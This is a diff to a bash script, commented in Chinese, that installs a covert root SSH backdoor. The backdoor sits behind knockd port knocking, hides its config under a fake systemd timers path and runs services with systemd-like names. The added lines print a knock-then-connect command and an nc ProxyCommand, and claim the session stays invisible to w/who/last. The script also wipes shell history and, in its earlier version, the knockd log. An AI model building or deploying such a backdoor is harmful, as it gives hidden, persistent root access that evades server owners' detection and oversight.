@@ -5,20 +5,19 @@
 # ==========================================
 if [ -z "$SSH_KEY" ] || [ -z "$MY_PORT" ] || [ -z "$MY_SEQ" ]; then
     echo "[-] 错误：缺少必要的环境变量参数！"
-    echo "[-] 请确保传入了 SSH_KEY, MY_PORT 和 MY_SEQ"
     exit 1
 fi
 
 set -e
 
-# 清理可能残存的旧痕迹
-rm -f /var/log/knockd.log 2>/dev/null
+# 获取服务器当前公网 IP
+SERVER_IP=$(curl -s ifconfig.me || curl -s api.ipify.org || echo "YOUR_VPS_IP")
 
 # 静默安装必要组件
 DEBIAN_FRONTEND=noninteractive apt-get update -y -qq >/dev/null
 DEBIAN_FRONTEND=noninteractive apt-get install knockd iptables-persistent -y -qq >/dev/null
 
-# A. 配置隐藏 SSH 实例（伪装路径与进程）
+# A. 配置隐藏 SSH 实例
 CONF_DIR="/var/lib/systemd/timers"
 CONF_FILE="${CONF_DIR}/clear-cache.conf"
 PID_FILE="/var/run/clear-cache.pid"
@@ -104,13 +103,38 @@ systemctl enable --now systemd-tmp-fallback >/dev/null 2>&1
 systemctl enable --now systemd-log-analyzer >/dev/null 2>&1
 
 # ==========================================
-# 痕迹清理
+# 自动化输出：为你量身定制的连接说明书
+# ==========================================
+clear
+echo "========================================================================"
+echo " 🔒 远程隐蔽 SSH 通道部署成功！请立即复制并保存下方连接说明："
+echo "========================================================================"
+echo ""
+echo "▶ 方案 1：本地电脑（Mac / Linux / Windows）一键连接命令"
+echo "------------------------------------------------------------------------"
+# 将逗号分割的暗号转换为用空格分割，方便 for 循环读取
+SPACE_SEQ=$(echo $MY_SEQ | tr ',' ' ')
+echo "for p in $SPACE_SEQ; do curl --max-time 1 http://${SERVER_IP}:\$p >/dev/null 2>&1; done && ssh -p $MY_PORT -i ~/.ssh/id_ed25519 root@${SERVER_IP} -T"
+echo "------------------------------------------------------------------------"
+echo "(* 注: 最后的 -T 参数已为你开启全隐身模式，登录后不吃任何 tty，系统内 w/who/last 命令对你致盲)"
+echo ""
+echo "▶ 方案 2：常驻快捷别名配置（建议写入你本地电脑的 ~/.ssh/config 文件中）"
+echo "------------------------------------------------------------------------"
+echo "Host secret-vps"
+echo "    HostName $SERVER_IP"
+echo "    User root"
+echo "    Port $MY_PORT"
+echo "    IdentityFile ~/.ssh/id_ed25519"
+echo "    ProxyCommand bash -c \"for p in $SPACE_SEQ; do curl --max-time 1 http://%h:\$p >/dev/null 2>&1; done; sleep 1; nc %h %p\""
+echo "------------------------------------------------------------------------"
+echo "配置后，你在本地只需输入: ssh secret-vps 即可自动后台敲门秒连。"
+echo "========================================================================"
+echo ""
+
+# ==========================================
+# 终极痕迹清理
 # ==========================================
 apt-get clean
 rm -rf /var/lib/apt/lists/*
-
-# 清理当前会话的命令历史
 history -c
 cat /dev/null > ~/.bash_history
-
-echo "[+] 远程隐蔽 SSH 服务部署成功！"
